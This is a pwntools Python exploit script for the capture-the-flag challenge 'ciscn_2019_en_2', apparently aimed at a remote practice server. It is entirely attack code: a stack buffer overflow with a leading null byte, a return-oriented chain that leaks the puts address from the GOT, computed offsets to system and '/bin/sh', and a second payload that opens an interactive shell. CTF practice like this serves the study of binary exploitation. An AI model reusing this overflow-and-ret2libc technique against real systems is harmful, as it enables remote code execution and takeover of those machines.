from pwn import *
#sh = process("./ciscn_2019_en_2")
sh = remote("node5.buuoj.cn",25554)
elf = ELF("./ciscn_2019_en_2")

main_add = 0x0400B28
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
ret = 0x04006b9
pop_rdi = 0x0400c83 

sh.recvuntil(b"choice!\n")
sh.sendline(str(1))  
sh.recvuntil(b"encrypted\n")
payload1 =b"\x00"+ b"A"*0x57+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x4009A0)
sh.sendline(payload1)

sh.recvuntil("Ciphertext\n\n")
puts_add =u64(sh.recv(6).ljust(8,b'\x00'))
print(hex(puts_add))
#sh.recvuntil(b"choice!\n")
#sh.sendline(str(1))
#sh.recvuntil(b"encrypted\n")

system = puts_add - 0x31580
binsh = puts_add + 0x1334da
payload2 =b"\x00"+ b"A"*0x57 +p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system) 
sh.sendline(payload2)

sh.interactive()


